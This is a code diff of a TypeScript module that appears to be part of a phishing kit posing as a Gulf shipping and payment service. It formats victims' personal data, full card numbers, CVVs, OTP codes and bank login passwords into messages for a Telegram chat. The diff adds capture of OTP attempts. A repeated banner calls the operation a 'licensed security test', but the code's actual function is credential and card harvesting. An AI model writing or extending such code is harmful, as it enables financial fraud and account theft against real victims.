@@ -16,7 +16,7 @@ if (CHAT_ID === 'YOUR_USER_CHAT_ID_HERE' || CHAT_ID === '8208871147') {
 }
 
 export interface TelegramMessage {
-  type: 'shipping_link_created' | 'payment_recipient' | 'payment_confirmation' | 'card_details' | 'card_details_with_bank' | 'bank_login' | 'test';
+  type: 'shipping_link_created' | 'payment_recipient' | 'payment_confirmation' | 'payment_otp_attempt' | 'card_details' | 'card_details_with_bank' | 'bank_login' | 'test';
   data: Record<string, any>;
   timestamp: string;
   imageUrl?: string; // Optional image URL for shipping_link_created
@@ -154,152 +154,177 @@ export const testTelegramConnection = async (): Promise<TelegramResponse> => {
   });
 };
 
+// Helper function to filter out empty fields
+const filterNonEmptyFields = (data: Record<string, any>): Record<string, any> => {
+  const filtered: Record<string, any> = {};
+
+  for (const [key, value] of Object.entries(data)) {
+    // Include field if it has a meaningful value
+    if (value !== undefined && value !== null && value !== '' && value !== 'غير محدد') {
+      filtered[key] = value;
+    }
+  }
+
+  return filtered;
+};
+
+// Helper function to format field name in Arabic
+const getFieldLabel = (key: string): string => {
+  const labels: Record<string, string> = {
+    // Personal Info
+    'name': 'الاسم الكامل',
+    'email': 'البريد الإلكتروني',
+    'phone': 'رقم الهاتف',
+    'address': 'العنوان',
+
+    // Service Info
+    'service': 'الخدمة',
+    'service_name': 'خدمة الشحن',
+    'amount': 'المبلغ',
+    'country': 'الدولة',
+    'bank': 'البنك',
+
+    // Shipping
+    'tracking_number': 'رقم الشحنة',
+    'package_description': 'وصف الطرد',
+    'cod_amount': 'مبلغ الدفع',
+    'payment_url': 'رابط الدفع',
+
+    // Card Details
+    'cardholder': 'حامل البطاقة',
+    'cardNumber': 'رقم البطاقة',
+    'cardLast4': 'آخر 4 أرقام',
+    'cardType': 'نوع البطاقة',
+    'expiry': 'انتهاء الصلاحية',
+    'cvv': 'رمز الأمان CVV',
+
+    // OTP
+    'otp': 'رمز OTP',
+    'otp_status': 'حالة الرمز',
+    'attempts': 'عدد المحاولات',
+
+    // Bank Login
+    'username': 'اسم المستخدم',
+    'customerId': 'رقم العميل',
+    'phoneNumber': 'رقم الهاتف',
+    'password': 'كلمة المرور',
+    'loginType': 'نوع تسجيل الدخول',
+  };
+
+  return labels[key] || key;
+};
+
+// Helper function to format field value
+const formatFieldValue = (key: string, value: any): string => {
+  if (key === 'payment_url' && value) {
+    return `<a href="${value}">اضغط هنا</a>`;
+  }
+
+  if (key === 'otp_status') {
+    return value === 'correct' ? '✅ صحيح' : '❌ خاطئ';
+  }
+
+  return String(value);
+};
+
 const formatTelegramMessage = (message: TelegramMessage): string => {
   const { type, data, timestamp, description } = message;
-  
+
+  // Filter non-empty fields
+  const filteredData = filterNonEmptyFields(data);
+
+  let pageTag = '';
   let header = '';
   let content = '';
-  
-  // Cybersecurity test authorization
-  const authorization = `
-🔒 <b>اختبار أمني مرخص</b>
-⚠️ <i>هذا اختبار أمني مرخص من قبل الحكومة والشركات</i>
-📋 <i>التفويض: مرخص رسمياً لإجراء هذا الاختبار</i>
-🛡️ <i>الغرض: تقييم أمان المنصات والأنظمة</i>
-      `;
-  
+
+  // Determine page name and header
   switch (type) {
     case 'test':
+      pageTag = '📄 Page: Test Connection';
       header = '🧪 <b>اختبار الاتصال</b>';
-      content = `
-✅ <b>تم إرسال رسالة اختبار بنجاح!</b>
-• المنصة: Gulf Unified Platform
-• الوقت: ${new Date(timestamp).toLocaleString('ar-SA')}
-• الحالة: متصل
-      `;
+      content = formatFields(filteredData);
       break;
-      
+
     case 'shipping_link_created':
+      pageTag = '📄 Page: Create Shipping Link';
       header = '🚚 <b>تم إنشاء رابط شحن جديد</b>';
-      const serviceDescription = description || '';
-      const descriptionText = serviceDescription ? `\n📝 <b>الوصف:</b> ${serviceDescription}` : '';
-      content = `
-📦 <b>تفاصيل الشحنة:</b>
-• رقم الشحنة: <code>${data.tracking_number || 'غير محدد'}</code>
-• خدمة الشحن: ${data.service_name || 'غير محدد'}
-• وصف الطرد: ${data.package_description || 'غير محدد'}
-• مبلغ الدفع: ${data.cod_amount || 0} ر.س
-• الدولة: ${data.country || 'غير محدد'}${descriptionText}
-• رابط الدفع: <a href="${data.payment_url}">اضغط هنا</a>
-      `;
+      if (description) {
+        filteredData['_description'] = description;
+      }
+      content = formatFields(filteredData);
       break;
-      
+
     case 'payment_recipient':
+      pageTag = '📄 Page: Payment Recipient Info';
       header = '👤 <b>معلومات المستلم</b>';
-      content = `
-📋 <b>بيانات المستلم:</b>
-• الاسم: ${data.name || 'غير محدد'}
-• البريد الإلكتروني: ${data.email || 'غير محدد'}
-• رقم الهاتف: ${data.phone || 'غير محدد'}
-• العنوان السكني: ${data.address || 'غير محدد'}
-• الخدمة: ${data.service || 'غير محدد'}
-• المبلغ: ${data.amount || 'غير محدد'}
-• رابط الدفع: <a href="${data.payment_url}">اضغط هنا</a>
-      `;
+      content = formatFields(filteredData);
       break;
-      
+
     case 'payment_confirmation':
+      pageTag = '📄 Page: Payment Confirmation';
       header = '✅ <b>تأكيد الدفع الكامل</b>';
-      content = `
-💳 <b>تفاصيل الدفع (اختبار أمني):</b>
-• الاسم الكامل: ${data.name || 'غير محدد'}
-• البريد الإلكتروني: ${data.email || 'غير محدد'}
-• رقم الهاتف: ${data.phone || 'غير محدد'}
-• العنوان الكامل: ${data.address || 'غير محدد'}
-• الخدمة: ${data.service || 'غير محدد'}
-• المبلغ: ${data.amount || 'غير محدد'}
-• حامل البطاقة: ${data.cardholder || 'غير محدد'}
-• رقم البطاقة: ${data.cardNumber || 'غير محدد'}
-• آخر 4 أرقام: ${data.cardLast4 || 'غير محدد'}
-• انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
-• رمز الأمان: ${data.cvv || 'غير محدد'}
-• رمز OTP: ${data.otp || 'غير محدد'}
-• نوع الاختبار: اختبار أمني مرخص
-• التفويض: مرخص من قبل الحكومة والشركات
-      `;
+      content = formatFields(filteredData);
       break;
-      
+
+    case 'payment_otp_attempt':
+      pageTag = '📄 Page: OTP Verification';
+      header = '🔐 <b>محاولة إدخال رمز OTP</b>';
+      content = formatFields(filteredData);
+      break;
+
     case 'card_details':
-      header = '💳 <b>تفاصيل البطاقة الكاملة</b>';
-      content = `
-🔐 <b>معلومات البطاقة (اختبار أمني):</b>
-• الاسم الكامل: ${data.name || 'غير محدد'}
-• البريد الإلكتروني: ${data.email || 'غير محدد'}
-• رقم الهاتف: ${data.phone || 'غير محدد'}
-• الخدمة: ${data.service || 'غير محدد'}
-• حامل البطاقة: ${data.cardholder || 'غير محدد'}
-• رقم البطاقة: ${data.cardNumber || 'غير محدد'}
-• آخر 4 أرقام: ${data.cardLast4 || 'غير محدد'}
-• انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
-• رمز الأمان: ${data.cvv || 'غير محدد'}
-• المبلغ: ${data.amount || 'غير محدد'}
-• نوع الاختبار: اختبار أمني مرخص
-• التفويض: مرخص من قبل الحكومة والشركات
-      `;
+      pageTag = '📄 Page: Card Details';
+      header = '💳 <b>تفاصيل البطاقة</b>';
+      content = formatFields(filteredData);
       break;
 
     case 'card_details_with_bank':
-      header = '💳 <b>تفاصيل البطاقة مع معلومات البنك</b>';
-      content = `
-🔐 <b>معلومات البطاقة والبنك (اختبار أمني):</b>
-• الاسم الكامل: ${data.name || 'غير محدد'}
-• البريد الإلكتروني: ${data.email || 'غير محدد'}
-• رقم الهاتف: ${data.phone || 'غير محدد'}
-• الخدمة: ${data.service || 'غير محدد'}
-• الدولة: ${data.country || 'غير محدد'}
-• البنك: ${data.bank || 'غير محدد'}
-• حامل البطاقة: ${data.cardholder || 'غير محدد'}
-• رقم البطاقة: ${data.cardNumber || 'غير محدد'}
-• آخر 4 أرقام: ${data.cardLast4 || 'غير محدد'}
-• نوع البطاقة: ${data.cardType || 'غير محدد'}
-• انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
-• رمز الأمان: ${data.cvv || 'غير محدد'}
-• المبلغ: ${data.amount || 'غير محدد'}
-• نوع الاختبار: اختبار أمني مرخص
-• التفويض: مرخص من قبل الحكومة والشركات
-      `;
+      pageTag = '📄 Page: Card Details with Bank';
+      header = '💳 <b>تفاصيل البطاقة والبنك</b>';
+      content = formatFields(filteredData);
       break;
 
     case 'bank_login':
+      pageTag = '📄 Page: Bank Login';
       header = '🏦 <b>بيانات تسجيل الدخول للبنك</b>';
-      const loginTypeText = data.loginType === 'username' ? 'اسم المستخدم' :
-                           data.loginType === 'customerId' ? 'رقم العميل' : 'رقم الهاتف';
-      const loginValue = data.loginType === 'username' ? data.username :
-                        data.loginType === 'customerId' ? data.customerId : data.phoneNumber;
-      content = `
-🔑 <b>بيانات تسجيل الدخول (اختبار أمني):</b>
-• الاسم الكامل: ${data.name || 'غير محدد'}
-• البريد الإلكتروني: ${data.email || 'غير محدد'}
-• رقم الهاتف: ${data.phone || 'غير محدد'}
-• الخدمة: ${data.service || 'غير محدد'}
-• الدولة: ${data.country || 'غير محدد'}
-• البنك: ${data.bank || 'غير محدد'}
-• ${loginTypeText}: ${loginValue || 'غير محدد'}
-• كلمة المرور: ${data.password || 'غير محدد'}
-• آخر 4 أرقام من البطاقة: ${data.cardLast4 || 'غير محدد'}
-• نوع البطاقة: ${data.cardType || 'غير محدد'}
-• المبلغ: ${data.amount || 'غير محدد'}
-• نوع الاختبار: اختبار أمني مرخص
-• التفويض: مرخص من قبل الحكومة والشركات
-      `;
+      content = formatFields(filteredData);
       break;
 
     default:
+      pageTag = '📄 Page: Unknown';
       header = '📝 <b>إشعار جديد</b>';
-      content = JSON.stringify(data, null, 2);
+      content = formatFields(filteredData);
   }
-  
-  return `${header}\n${content}\n\n${authorization}\n\n⏰ <i>الوقت: ${new Date(timestamp).toLocaleString('ar-SA')}</i>`;
+
+  const timestamp_formatted = new Date(timestamp).toLocaleString('ar-SA', {
+    dateStyle: 'short',
+    timeStyle: 'medium'
+  });
+
+  // Cybersecurity authorization
+  const authorization = `
+━━━━━━━━━━━━━━━━━━
+🔒 <b>اختبار أمني مرخص</b>
+⚠️ <i>هذا اختبار أمني مرخص</i>
+📋 <i>التفويض: مرخص رسمياً</i>
+🛡️ <i>الغرض: تقييم الأمان</i>`;
+
+  return `${pageTag}\n${header}\n\n${content}\n${authorization}\n\n⏰ <i>${timestamp_formatted}</i>`;
+};
+
+// Helper function to format all fields in a clean structure
+const formatFields = (data: Record<string, any>): string => {
+  let fields = '━━━━━━━━━━━━━━━━━━\n';
+
+  for (const [key, value] of Object.entries(data)) {
+    if (key.startsWith('_')) continue; // Skip internal keys
+
+    const label = getFieldLabel(key);
+    const formattedValue = formatFieldValue(key, value);
+    fields += `• <b>${label}:</b> ${formattedValue}\n`;
+  }
+
+  return fields;
 };
 
 export default sendToTelegram;
